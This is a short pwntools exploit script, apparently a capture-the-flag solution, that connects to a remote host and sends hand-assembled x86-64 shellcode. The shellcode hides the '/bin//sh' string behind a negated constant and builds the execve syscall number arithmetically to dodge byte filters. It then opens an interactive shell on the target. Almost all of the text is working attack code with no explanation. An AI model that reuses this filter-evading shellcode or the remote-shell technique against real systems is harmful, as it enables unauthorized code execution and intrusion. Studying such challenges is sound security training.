from pwn import *

elf = ELF("./execute")

#io = elf.process()

context.binary = elf

io = remote("83.136.252.32", 54238)
#io = remote("127.0.0.1", 1024)

shellcode = shellcraft.sh()

shellcode = """
    mov eax, 0x41414141
    sub eax, 0x41414141
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx

    mov rcx, rsp
    push rcx

    pop rcx
    mov rdi, rcx

    cdq
    push rdx
    push rdi

    mov rcx, rsp
    push rcx

    pop rsi
    
    mov al, 0x41
    sub al, 0x6
    syscall
"""

print("[+] Esto esta en asm: ", shellcode)

shellcode = asm(shellcode)

io.recvuntil("everything")

io.sendline(shellcode.ljust(60, b'\x00'))

io.interactive()
